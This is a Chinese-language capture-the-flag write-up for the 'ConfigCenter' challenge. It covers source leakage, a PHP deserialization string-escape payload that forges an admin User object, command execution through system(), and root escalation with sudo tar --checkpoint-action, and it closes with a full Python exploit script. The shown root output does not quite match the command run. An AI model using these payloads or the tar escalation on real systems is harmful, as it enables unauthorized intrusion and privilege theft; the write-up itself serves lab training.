# ConfigCenter —— 配置管理中心 Writeup

> **平台**：iChunqiu 春秋云镜（cloudeci）  
> **类型**：Web（PHP 反序列化 → RCE → 提权）  
> **环境**：PHP/8.2.31  
> **Flag**：`flag{4c716693-ca6a-4103-8550-f76bb0309306}`

---

## 一、题目信息

- 应用名称：**ConfigCenter - 配置管理中心**（企业级配置备份与恢复系统）
- 功能：配置导入导出、批量恢复、审计日志
- 首页 `index.php` 提供「恢复配置」表单，`note`（备注）与 `data`（数据）提交到 `api/restore.php`
- `admin.php` 为管理后台，需管理员权限（403），内含「系统诊断」命令执行功能

---

## 二、源码泄露

站点根目录存在备份压缩包，可直接下载完整源码：

```
GET /www.zip   → 200
```

解压得到：

```
admin.php           # 管理后台（含 system() 命令执行）
api/restore.php     # 配置恢复接口（反序列化点）
class/User.php      # User 类（__wakeup / __unserialize）
config.php          # SITE_KEY + 测试 flag
index.php           # 首页
loader.php          # S() 源码保护解密函数
```

---

## 三、代码审计

### 3.1 源码保护解密 `loader.php`

```php
function S($s) {
    $raw = base64_decode($s);
    $key = SITE_KEY;                 // 'bd18306e92864e39'
    $out = '';
    for ($i = 0; $i < strlen($raw); $i++) {
        $c = ord($raw[$i]) ^ ord($key[$i % strlen($key)]);
        $c = ($c - $i) & 0xFF;
        $out .= chr($c);
    }
    return $out;
}
```

所有关键字符串均用 `S()` 混淆。解密得到：

| 密文 | 明文 |
|------|------|
| `S('CxBQXFtCWRA=')` | `is_admin`（session 键名） |
| `S('BgZHXA==')` | `data` |
| `S('AwFeVEE=')` | `admin` |
| `S('AQpX')` | `cmd` |
| `S('Gg==')` → `S('Gh4=')` | `x` → `xy`（safe_filter 替换） |

### 3.2 反序列化点 `api/restore.php`

```php
function safe_filter($s) {
    return str_replace(S('Gg=='), S('Gh4='), $s);   // 'x' → 'xy'
}

$note = $_POST['note']; $data = $_POST['data'];

$ser = 'a:2:{s:4:"note";s:' . strlen($note) . ':"' . $note
     . '";s:4:"data";s:' . strlen($data) . ':"' . $data . '";}';
$ser = safe_filter($ser);
$obj = @unserialize($ser);

if (is_array($obj) && isset($obj['data'])) {
    $payload = $obj['data'];
    if ($payload instanceof User && $payload->role === 'admin') {
        $_SESSION['is_admin'] = true;    // 成为管理员
    }
}
```

### 3.3 User 类 `class/User.php`

```php
class User {
    public $role = 'guest';

    public function __wakeup() {          // 兜底：重置角色
        $this->role = 'guest';
    }

    public function __unserialize(array $data) {   // 恢复属性
        foreach ($data as $k => $v) { $this->$k = $v; }
    }
}
```

**关键**：`__unserialize()` 优先级高于 `__wakeup()`。  
当反序列化时，PHP 调用 `__unserialize()` 恢复属性，**不会**调用 `__wakeup()`，因此 `role='admin'` 不会被重置。

---

## 四、漏洞利用：PHP 反序列化字符串逃逸

### 4.1 逃逸原理

`safe_filter` 用 `str_replace('x','xy')` 让序列化字符串**变长**（每个 `x` 多 1 字节），但声明长度仍按替换前计算，造成「声明长度 < 实际长度」，反序列化器只读取声明长度的字符，**多出的字符逃逸**为新的序列化结构。

### 4.2 序列化结构

```text
a:2:{s:4:"note";s:<L1>:"<note>";s:4:"data";s:<L2>:"<data>";}
```

### 4.3 Payload 构造

注入串（闭合 note 字符串 + 覆盖 data 为对象 + 闭合数组）：

```
INJECT = ";s:4:"data";O:4:"User":1:{s:4:"role";s:5:"admin";}}
```

令 `note = 'x' * len(INJECT) + INJECT`（`data` 为空）。

- 原始 `note` 长度 = `2 * len(INJECT)` = 104
- 替换后前 104 个字符恰好是 `xy`*52，反序列化器读取这 104 字节作为 note 值
- 剩余 `INJECT` 逃逸出来，被解析为：`";` 闭合 note → `s:4:"data";` 键 → `O:4:"User":...` 对象 → `}` 闭合数组

最终数组：`['note' => 'xyxy...', 'data' => User(role='admin')]`

```python
INJECT = '";s:4:"data";O:4:"User":1:{s:4:"role";s:5:"admin";}}'
note = 'x' * len(INJECT) + INJECT
# POST /api/restore.php  {note: note, data: ""}
```

响应：`{"status":"ok","msg":"恢复成功，管理员会话已恢复"}`，同时 `$_SESSION['is_admin']=true`。

---

## 五、RCE（admin.php 命令执行）

拿到管理员会话后，访问 `admin.php`，其「系统诊断」直接调用：

```php
system($_POST['cmd']);
```

于是获得 `www-data` 权限的任意命令执行：

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 六、权限提升：sudo tar（GTFOBins）

`sudo -l` 显示 www-data 可免密执行：

```
(root) NOPASSWD: /usr/bin/tar
```

利用 tar 的 `--checkpoint-action=exec` 以 root 执行命令：

```bash
sudo tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec='sh -c "cat /root/flag.txt"'
```

输出：

```text
uid=0(root) gid=0(root)
flag{4c716693-ca6a-4103-8550-f76bb0309306}
```

---

## 七、Flag

```text
flag{4c716693-ca6a-4103-8550-f76bb0309306}
```

---

## 八、完整利用脚本（Python）

```python
import urllib.request, urllib.parse, http.cookiejar, ssl, re

ctx = ssl._create_unverified_context()
BASE = 'https://<target>:80'
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cj),
    urllib.request.HTTPSHandler(context=ctx))

def post(path, data):
    body = urllib.parse.urlencode(data).encode()
    return op.open(urllib.request.Request(BASE+path, data=body), timeout=30).read().decode()

# 1. 反序列化注入 -> admin session
INJECT = '";s:4:"data";O:4:"User":1:{s:4:"role";s:5:"admin";}}'
post('/api/restore.php', {'note': 'x'*len(INJECT)+INJECT, 'data': ''})

# 2. RCE
def run(cmd):
    out = post('/admin.php', {'cmd': cmd})
    return re.search(r'执行结果:(.*?)</div>', out, re.S).group(1)

# 3. 提权读 flag
print(run('sudo tar -cf /dev/null /dev/null --checkpoint=1 '
          '--checkpoint-action=exec=\'sh -c "cat /root/flag.txt"\' 2>&1'))
```
